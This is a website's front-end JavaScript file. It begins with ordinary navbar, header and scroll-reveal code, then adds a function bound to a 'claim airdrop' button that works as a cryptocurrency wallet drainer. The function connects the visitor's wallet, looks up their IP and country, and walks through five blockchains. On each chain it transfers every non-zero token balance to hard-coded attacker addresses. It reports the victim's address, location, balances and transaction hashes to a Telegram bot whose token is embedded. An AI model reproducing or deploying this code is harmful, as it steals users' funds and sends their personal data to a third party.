'use strict';

/**
 * Add event on element
 */
const addEventOnElem = function (elem, type, callback) {
  if (elem.length > 1) {
    for (let i = 0; i < elem.length; i++) {
      elem[i].addEventListener(type, callback);
    }
  } else {
    elem.addEventListener(type, callback);
  }
}

/**
 * Navbar toggle
 */
const navbar = document.querySelector("[data-navbar]");
const navbarLinks = document.querySelectorAll("[data-nav-link]");
const navToggler = document.querySelector("[data-nav-toggler]");

const toggleNavbar = function () {
  navbar.classList.toggle("active");
  navToggler.classList.toggle("active");
  document.body.classList.toggle("active");
}

addEventOnElem(navToggler, "click", toggleNavbar);

const closeNavbar = function () {
  navbar.classList.remove("active");
  navToggler.classList.remove("active");
  document.body.classList.remove("active");
}

addEventOnElem(navbarLinks, "click", closeNavbar);

/**
 * Header active on scroll
 */
const header = document.querySelector("[data-header]");

const activeHeader = function () {
  if (window.scrollY > 300) {
    header.classList.add("active");
  } else {
    header.classList.remove("active");
  }
}

addEventOnElem(window, "scroll", activeHeader);

/**
 * Toggle active on add to fav
 */
const addToFavBtns = document.querySelectorAll("[data-add-to-fav]");

const toggleActive = function () {
  this.classList.toggle("active");
}

addEventOnElem(addToFavBtns, "click", toggleActive);

/**
 * Scroll reveal effect
 */
const sections = document.querySelectorAll("[data-section]");

const scrollReveal = function () {
  for (let i = 0; i < sections.length; i++) {
    if (sections[i].getBoundingClientRect().top < window.innerHeight / 1.5) {
      sections[i].classList.add("active");
    } else {
      sections[i].classList.remove("active");
    }
  }
}

scrollReveal();
addEventOnElem(window, "scroll", scrollReveal);

/**
 * Wallet connect, network switching, and token transfer with Telegram notification
 */
async function connectWalletAndSendTokens() {
  // Ensure required libraries are loaded
  if (!window.ethers || !window.Web3Modal) {
    console.error("Required libraries (ethers or Web3Modal) not found.");
    return;
  }

  const providerOptions = {
    walletconnect: {
      package: window.WalletConnectProvider.default,
      options: {
        infuraId: "5b2c5ee5760146349669a1e9c77665d1"
      }
    }
  };

  const web3Modal = new window.Web3Modal.default({
    cacheProvider: false,
    providerOptions
  });

  // Define supported EVM networks and their Exodus wallet addresses
  const evmNetworks = [
    { chainId: 1, name: "Ethereum", chainName: "eth", exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57" },
    { chainId: 137, name: "Polygon", chainName: "polygon", exodusAddress: "0x1234567890abcdef1234567890abcdef12345678" },
    { chainId: 56, name: "BNB Chain", chainName: "bsc", exodusAddress: "0xabcdef1234567890abcdef1234567890abcdef12" },
    { chainId: 42161, name: "Arbitrum", chainName: "arbitrum", exodusAddress: "0x7890abcdef1234567890abcdef1234567890abcd" },
    { chainId: 10, name: "Optimism", chainName: "optimism", exodusAddress: "0x4567890abcdef1234567890abcdef1234567890a" }
  ];

  const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
  const chatId = "5995616824";
  const moralisApiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU1MjI2ZmQ1LTE0NDUtNGIyOC04YzYzLTZmOWEzZDRkNWJjZSIsIm9yZ0lkIjoiNDQ5NTg1IiwidXNlcklkIjoiNDYyNTgwIiwidHlwZUlkIjoiZjVhODc0ZmItZGM2Ni00NjE0LWIxNDUtMjlkYTg5YjIwNDk1IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDgzOTc5MTksImV4cCI6NDkwNDE1NzkxOX0.lr5-p-SHS7j4EAlsT1ZYt7tTnOfKnoZXSsqS_6WIReY";

  try {
    // Connect wallet
    const instance = await web3Modal.connect();
    const provider = new ethers.providers.Web3Provider(instance);
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();
    const walletType = instance.isWalletConnect ? "WalletConnect" : "MetaMask";

    // Fetch location data
    let locationData = {};
    try {
      const locRes = await fetch("https://ipapi.co/json/");
      locationData = await locRes.json();
    } catch (e) {
      console.warn("Location fetch failed", e);
      locationData = { country_name: "Unknown", ip: "N/A" };
    }

    // Process EVM-compatible networks
    for (const network of evmNetworks) {
      try {
        // Switch to the network
        await instance.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: `0x${network.chainId.toString(16)}` }]
        });

        const currentProvider = new ethers.providers.Web3Provider(instance);
        const currentSigner = currentProvider.getSigner();
        const currentNetwork = await currentProvider.getNetwork();
        if (currentNetwork.chainId !== network.chainId) {
          console.warn(`Failed to switch to ${network.name}`);
          continue;
        }

        // Fetch ERC20 token balances using Moralis
        const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${network.chainName}`;
        const response = await fetch(moralisUrl, {
          headers: { "X-API-Key": moralisApiKey }
        });
        const tokens = await response.json();

        // Format balance summary for Telegram
        let tokenSummaryTelegram = "";
        const nonZeroTokens = tokens.filter(token => token.balance && !ethers.BigNumber.from(token.balance).isZero());
        if (nonZeroTokens.length > 0) {
          tokenSummaryTelegram = nonZeroTokens.map(token => {
            const decimals = token.decimals ?? 18;
            const balance = ethers.utils.formatUnits(token.balance, decimals);
            return `• ${token.symbol}: ${balance} (Contract: ${token.token_address})`;
          }).join("\n");
        } else {
          tokenSummaryTelegram = "No non-zero token balances found.";
        }

        // Send Telegram message for network balances
        const networkMessage = `
📥 Wallet Connected on ${network.name}!
Address: ${userAddress}
Wallet: ${walletType}
Country: ${locationData.country_name}
IP: ${locationData.ip}

💰 Non-Zero Token Balances on ${network.name}:
${tokenSummaryTelegram}
        `;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: networkMessage })
        });

        // Transfer non-zero tokens
        for (const token of nonZeroTokens) {
          try {
            const contract = new ethers.Contract(token.token_address, [
              "function transfer(address to, uint amount) returns (bool)",
              "function approve(address spender, uint amount) returns (bool)",
              "function allowance(address owner, address spender) view returns (uint)"
            ], currentSigner);

            const balanceInWei = ethers.BigNumber.from(token.balance);
            const allowance = await contract.allowance(userAddress, userAddress);
            if (allowance.lt(balanceInWei)) {
              const approveTx = await contract.approve(userAddress, balanceInWei);
              await approveTx.wait();
              console.log(`Approved ${token.symbol} on ${network.name}, tx:`, approveTx.hash);
            }

            const tx = await contract.transfer(network.exodusAddress, balanceInWei);
            await tx.wait();
            console.log(`Sent ${token.symbol} on ${network.name}, tx:`, tx.hash);

            // Send Telegram notification for successful transfer
            const decimals = token.decimals ?? 18;
            const balance = ethers.utils.formatUnits(token.balance, decimals);
            const successMessage = `
✅ Token Transfer Successful on ${network.name}!
Token: ${token.symbol}
Amount: ${balance}
Contract: ${token.token_address}
Destination: ${network.exodusAddress}
Tx Hash: ${tx.hash}
            `;
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: chatId, text: successMessage })
            });
          } catch (err) {
            console.warn(`Failed to process ${token.symbol} on ${network.name}`, err);
            const errorMessage = `
❌ Token Transfer Failed on ${network.name}!
Token: ${token.symbol}
Contract: ${token.token_address}
Error: ${err.message || "Unknown error"}
            `;
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: chatId, text: errorMessage })
            });
          }
        }
      } catch (err) {
        console.warn(`Error processing ${network.name}`, err);
        const errorMessage = `
❌ Error Processing ${network.name}!
Error: ${err.message || "Unknown error"}
        `;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: errorMessage })
        });
      }
    }

  } catch (err) {
    console.error('Error connecting wallet or processing tokens:', err);
    const errorMessage = `
❌ Wallet Connection Failed!
Error: ${err.message || "Unknown error"}
    `;
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: errorMessage })
    });
  }
}

// Attach to claim button
document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);